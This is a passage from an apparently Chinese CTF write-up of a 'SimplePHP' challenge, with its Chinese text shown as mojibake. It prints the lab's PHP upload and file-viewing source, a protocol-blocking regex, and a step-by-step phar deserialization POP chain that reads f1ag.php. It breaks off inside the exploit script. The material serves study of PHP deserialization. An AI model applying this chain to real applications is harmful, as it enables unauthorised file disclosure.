class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="è¯»å–function-php"><a href="#è¯»å–function-php" class="headerlink" title="è¯»å–function.php:"></a>è¯»å–function.php:</h3><h4 id="function-php"><a href="#function-php" class="headerlink" title="function.php:"></a>function.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__); </span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-comment">// è®¾ç½®filenameä¸ºä¸Šä¼ çš„æ–‡ä»¶åä¸$_SERVER[&quot;REMOTE_ADDR&quot;]æ‹¼æ¥åçš„å­—ç¬¦ä¸²çš„md5åŠ å¯†å­—ç¬¦ä¸²</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-comment">// åˆ¤æ–­upload/æ–‡ä»¶å¤¹ä¸‹æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        <span class="hljs-comment">// å¦‚æœå­˜åœ¨åŒæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œåˆ™å°†å…¶åˆ é™¤ï¼Œunlinkå¯ä»¥è§¦å‘pharååºåˆ—åŒ–</span><br>        <span class="hljs-comment">// ä½†æ˜¯ç”±äºå½“å‰phpç¨‹åºæ²¡æœ‰å¼•ç”¨class.phpç±»ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨pharå‘åºåˆ—åŒ–è§¦å‘popé“¾</span><br>        <span class="hljs-comment">// ä½†å¦‚æœè¯¥ç±»è¢«å¼•ç”¨ï¼Œå¼•ç”¨çš„phpæ–‡ä»¶ä¸­åŒæ ·å¼•ç”¨äº†class.php,åˆ™å¯ä»¥ä½¿ç”¨pharååºåˆ—åŒ–</span><br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    <span class="hljs-comment">// å°†æ–‡ä»¶å†…å®¹è½¬ç§»åˆ°æ–°çš„æ–‡ä»¶å¤¹uploadä¸‹</span><br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br>    <span class="hljs-comment">// è¾“å‡ºæ–‡ä»¶ä¸Šä¼ æˆåŠŸçš„ä¿¡æ¯</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-comment">// å…ˆè¿›è¡Œå¯¹æ–‡ä»¶çš„æ£€æŸ¥</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) &#123; <br>        <span class="hljs-comment">// æ–‡ä»¶ä¸ºç™½åå•æ–‡ä»¶æ—¶ï¼Œå°†æ–‡ä»¶ä¸Šä¼ </span><br>        <span class="hljs-title function_ invoke__">upload_file_do</span>(); <br>    &#125; <br>&#125; <br><span class="hljs-comment">// å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ£€æµ‹</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-comment">// è®¾ç½®ç™½åå•æ–‡ä»¶åç¼€åï¼Œpharååºåˆ—åŒ–å¯ä»¥è¿›è¡Œç»•è¿‡</span><br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); <br>    <span class="hljs-comment">// å°†æ–‡ä»¶åæŒ‰&#x27;.&#x27;åˆ†å‰²æˆå„ä¸ªæ•°ç»„</span><br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); <br>    <span class="hljs-comment">// è·å–$tempæ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ </span><br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123; <br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-comment">// åˆ¤æ–­æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åç¼€ååœ¨ä¸åœ¨ç™½åå•ä¸­</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="è¯»å–base-php"><a href="#è¯»å–base-php" class="headerlink" title="è¯»å–base.php:"></a>è¯»å–base.php:</h3><h4 id="base-php"><a href="#base-php" class="headerlink" title="base.php:"></a>base.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">session_start</span>(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;!DOCTYPE html&gt; <br>&lt;html&gt; <br>&lt;head&gt; <br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>    &lt;title&gt;web3&lt;/title&gt; <br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt; <br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt; <br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>    &lt;nav <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">navbar</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">default</span>&quot; <span class="hljs-title">role</span>=&quot;<span class="hljs-title">navigation</span>&quot;&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span>-<span class="hljs-title">fluid</span>&quot;&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span>-<span class="hljs-title">header</span>&quot;&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">a</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span>-<span class="hljs-title">brand</span>&quot; <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot;&gt;é¦–é¡µ&lt;/<span class="hljs-title">a</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbra</span>-<span class="hljs-title">toggle</span>&quot;&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">active</span>&quot;&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">file</span>.<span class="hljs-title">php</span>?<span class="hljs-title">file</span>=&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">upload_file</span>.<span class="hljs-title">php</span>&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">right</span>&quot;&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">glyphicon</span> <span class="hljs-title">glyphicon</span>-<span class="hljs-title">user</span>&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SERVER</span>[&#x27;<span class="hljs-title">REMOTE_ADDR</span>&#x27;];?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">    &lt;/<span class="hljs-title">nav</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt; </span><br><span class="hljs-class">&lt;!--<span class="hljs-title">flag</span> <span class="hljs-title">is</span> <span class="hljs-title">in</span> <span class="hljs-title">f1ag</span>.<span class="hljs-title">php</span>--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="è¯»å–f1ag-php"><a href="#è¯»å–f1ag-php" class="headerlink" title="è¯»å–f1ag.php:"></a>è¯»å–f1ag.php:</h3><p><img src="/images/2024-2-3-SimplePHP/image-20240131162701502.png" alt="image-20240131162701502"></p><p>æ— æ³•ç›´æ¥è®¿é—®f1ag.phpæ–‡ä»¶</p><h3 id="ä»£ç å®¡è®¡åˆ†æ"><a href="#ä»£ç å®¡è®¡åˆ†æ" class="headerlink" title="ä»£ç å®¡è®¡åˆ†æ:"></a>ä»£ç å®¡è®¡åˆ†æ:</h3><p><img src="/images/2024-2-3-SimplePHP/image-20240131165556845.png" alt="image-20240131165556845"></p><p>å¯ä»¥é€šè¿‡ç›´æ¥ç»•è¿‡preg_math()çš„æ£€æµ‹è·å–f1ag.phpçš„å†…å®¹</p><p><img src="/images/2024-2-3-SimplePHP/image-20240131165726408.png" alt="image-20240131165726408"></p><p>file.phpä¸­å­˜åœ¨file_exists()å‡½æ•°ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¯¥å‡½æ•°è§¦å‘pharååºåˆ—åŒ–ï¼Œè·å–f1ag.phpçš„å†…å®¹</p><p>è¿™é‡Œæˆ‘ä»¬å°è¯•ä½¿ç”¨pharååºåˆ—åŒ–è·å–f1ag.phpæ–‡ä»¶çš„å†…å®¹</p><h4 id="å±é™©å‡½æ•°"><a href="#å±é™©å‡½æ•°" class="headerlink" title="å±é™©å‡½æ•°:"></a>å±é™©å‡½æ•°:</h4><p><img src="/images/2024-2-3-SimplePHP/image-20240131165937286.png" alt="image-20240131165937286"></p><p><img src="/images/2024-2-3-SimplePHP/image-20240131165948278.png" alt="image-20240131165948278"></p><p>ç”±äº_show()å‡½æ•°åªæœ‰åœ¨file.phpä¸­æœ‰ä½¿ç”¨ï¼Œåœ¨class.phpä¸­æ²¡æœ‰å…¶ä»–åœ°æ–¹æœ‰ä½¿ç”¨è¯¥å‡½æ•°ï¼Œæ‰€ä»¥ç”¨è¯¥å‡½æ•°è¿›è¡Œpopé“¾ä¸ç†æƒ³ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨popé“¾è§¦å‘file_get()å‡½æ•°</p><h2 id="æ„é€ pharååºåŒ–"><a href="#æ„é€ pharååºåŒ–" class="headerlink" title="æ„é€ pharååºåŒ–:"></a>æ„é€ pharååºåŒ–:</h2><h3 id="popé“¾åˆ†æ"><a href="#popé“¾åˆ†æ" class="headerlink" title="popé“¾åˆ†æ:"></a>popé“¾åˆ†æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.$text = base64_encode(file_get_contents($value));<br>$value=f1ag.php<br><br>2.Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>$value=f1ag.php<br><br>3.Test::get($key)<br>=&gt;Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>$this-&gt;params[$key]=f1ag.php<br>$value=f1ag.php<br><br>4.Test::__get($key)<br>=&gt;Test::get($key)<br>=&gt;Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>$this-&gt;params[$key]=f1ag.php<br>$value=f1ag.php<br><br>5.è¦è§¦å‘__get()å‡½æ•°ï¼Œéœ€è¦è°ƒç”¨è¯¥ç±»çš„ç§æœ‰å˜é‡æˆ–ä¸å­˜åœ¨çš„å˜é‡æ—¶ï¼Œæ‰ä¼šè°ƒç”¨<br>Show::__toString()=&gt;$content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;<br>=&gt;Test::get($key)<br>=&gt;Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>Show-&gt;str[&#x27;str&#x27;]=new Test<br>$key=&#x27;source&#x27;<br>params=array(&#x27;source&#x27;=&gt;&#x27;f1ag.php&#x27;)<br>$this-&gt;params[$key]=f1ag.php<br>$value=f1ag.php<br><br>6.è¦è§¦å‘__toString()å‡½æ•°ï¼Œå½“è¾“å‡ºå¼•ç”¨è¯¥å‡½æ•°æ‰€åœ¨çš„å¯¹è±¡æ—¶ï¼Œæˆ–å¯¹ç±»è¿›è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å‡½æ•°ï¼ŒåŒæ ·ç”±äºæˆ‘ä»¬è·å–çš„f1ag.phpä¿¡æ¯æ˜¯é€šè¿‡returnè¿”å›çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æœ‰ä¸€ä¸ªè¾“å‡ºechoæˆ–printå»è¾“å‡ºæˆ‘ä»¬è·å–åˆ°çš„f1ag.phpæ–‡ä»¶ä¿¡æ¯ï¼Œæ‰€ä»¥è€ƒè™‘é‡‡ç”¨C1e4r::__destruct()=&gt;echo $this-&gt;test;//$this-&gt;test = new Show()<br>C1e4r::__destruct()=&gt;echo $this-&gt;test;<br>=&gt;Show::__toString()=&gt;$content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;<br>=&gt;Test::get($key)<br>=&gt;Test::file_get($value)<br>=&gt;$text = base64_encode(file_get_contents($value));<br>C1e4r-&gt;str = new Show()<br>C1e4r-&gt;test = new Show()<br>Show-&gt;str[&#x27;str&#x27;]=new Test<br>$key=&#x27;source&#x27;<br>params=array(&#x27;source&#x27;=&gt;&#x27;f1ag.php&#x27;)<br>$this-&gt;params[$key]=f1ag.php<br>$value=f1ag.php<br></code></pre></td></tr></table></figure><h3 id="æ„é€ popé“¾è„šæœ¬"><a href="#æ„é€ popé“¾è„šæœ¬" class="headerlink" title="æ„é€ popé“¾è„šæœ¬:"></a>æ„é€ popé“¾è„šæœ¬:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// è¯¥å‡½æ•°å¯ä»¥ç›´æ¥å±•ç¤ºæŒ‡å®šç›®å½•çš„æ–‡ä»¶ä¿¡æ¯ï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨</span><br>            <span class="hljs-comment">// ä½†æ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡preg_mathch()çš„æ£€æµ‹</span><br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> 